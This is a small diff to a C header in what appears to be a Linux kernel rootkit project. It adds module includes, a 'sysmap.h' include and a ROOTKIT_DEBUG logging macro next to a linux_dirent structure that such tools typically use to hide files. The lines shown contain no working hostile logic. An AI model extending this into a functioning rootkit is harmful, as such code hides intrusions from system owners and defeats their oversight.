@@ -1,7 +1,17 @@
 #ifndef INCLUDE_HEADER
 #define INCLUDE_HEADER
 
+#include <linux/module.h>
 #include <linux/types.h>
+
+#include "sysmap.h"
+
+/* some macros */
+#ifdef DEBUG
+#define ROOTKIT_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
+#else
+#define ROOTKIT_DEBUG(...)
+#endif
 
 /* dirent structure */
 struct linux_dirent {   
